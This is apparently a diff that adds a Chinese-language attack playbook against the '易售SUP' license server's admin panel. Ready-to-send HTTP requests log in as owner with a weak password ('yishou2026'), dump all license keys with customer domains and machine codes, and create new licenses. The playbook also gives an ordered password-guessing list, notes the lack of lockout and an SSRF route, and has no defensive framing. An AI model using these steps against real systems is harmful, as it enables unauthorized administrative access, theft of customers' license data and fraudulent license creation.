@@ -1,0 +1,87 @@
+# 易售SUP 授权服务器 :8090 管理后台超管弱口令（owner 全量授权码读写）
+
+## 0. 指纹
+- `:8090`，Go 后端，同时存在公开校验端点 `/auth/*` 与管理端点 `/admin/*`。
+- 确认：`GET /auth/activate` → `{"code":1,"message":"缺少 license_key"}`（200）。
+- `GET /admin/login` + 同端口即可判定是易售/易信SUP 授权服务器，而非 8080/8081 业务控制台。
+
+## 1. 失败基线（务必先做一组对照）
+```http
+POST /admin/login HTTP/1.1
+Host: <target>:8090
+Content-Type: application/json
+
+{"username":"admin","password":"admin"}
+```
+```http
+HTTP/1.1 200 OK
+账号或密码错误
+```
+固定 45 字节纯文本。**不要用状态码判成败**（成功也是 200）。
+
+## 2. 命中登录
+```http
+POST /admin/login HTTP/1.1
+Host: <target>:8090
+Content-Type: application/json
+
+{"username":"admin","password":"yishou2026"}
+```
+```http
+HTTP/1.1 200 OK
+
+{"code":0,"data":{"role":"owner","role_name":"超级管理员","token":"<64hex>|<exp_unix>|admin","username":"admin"},"message":"ok"}
+```
+判据 = body 出现 `code:0` 且 `data.role=owner`、`data.token` 非空。
+
+## 3. 拿全量授权码（读）
+```http
+GET /admin/licenses HTTP/1.1
+Host: <target>:8090
+Authorization: Bearer <token>
+```
+```json
+{"code":0,"data":{"list":[
+  {"id":8,"key":"YS-XXXX-XXXX-XXXX-XXXX","domains":"<客户域名>","machine_code":"<16hex>"},
+  {"id":9,"key":"...","domains":"..."}
+]},"message":"ok"}
+```
+字段：`key`=授权码、`domains`=客户绑定域名、`machine_code`=机器绑定、`customer_id`。同族端点 `/admin/customers` 给客户列表（拿 customer_id 用）。
+
+## 4. 自建授权码（写，有副作用）
+```http
+POST /admin/licenses/create HTTP/1.1
+Host: <target>:8090
+Authorization: Bearer <token>
+Content-Type: application/json
+
+{"customer_id":5,"plan":"flagship","days":365,"domains":"pc.<域名>"}
+```
+```json
+{"code":0,"data":{"list":[{"id":22,"key":"YS-XXXX-XXXX-XXXX-XXXX","domains":"...","days":365}]},"message":"ok"}
+```
+
+## 5. 口令来源思路
+口令按产品品牌派生：`yishou` + 年份/常见尾缀。首选序列：
+`admin/yishou2026` → `admin/yishou123` → `admin/admin123` → `test/yishou123` → `admin/<品牌><4位数字>`。
+次要来源：已泄露的 tenant_key / license_key 当口令（成本低，本目标 20 条均不通）。
+
+## 6. 判定清单
+1. 错误口令对照为 45B「账号或密码错误」且 200；
+2. 候选口令返回 200 + `code:0` + `data.token` + `role=owner`；
+3. 带 token 的 `GET /admin/licenses` 返回真实 key 列表（非空、含 domains/machine_code）。
+三条齐才判成立，缺 2/3 只是登录成功。
+
+## 7. 常见失败原因
+| 现象 | 原因 |
+|---|---|
+| 45B「账号或密码错误」 | 口令错；无锁定/无验证码，可继续加字典 |
+| 404 | 打的是 8080/8081 业务控制台，不是 8090 授权服务器 |
+| 401 / 返回 HTML 登录页 | 实现变更或前置反代加了 Basic 认证 |
+| 连不上 | 8090 仅监听 127.0.0.1 → 走 Activate/GoSystem auth_server SSRF |
+| token 过期 | 重登；token 格式 `<hash>|<exp_unix>|<user>` |
+
+## 8. 与同族免鉴权条目的关系
+- `/auth/activate`（无凭据，需已知 license_key）→ 只能验单个 key、拿元数据、会改绑。
+- 本条（超管 token）→ 可**枚举全量**授权码 + 客户，且能**新建**授权码。
+先打本条；打不通再用 /auth/activate 的 key oracle 兜底。
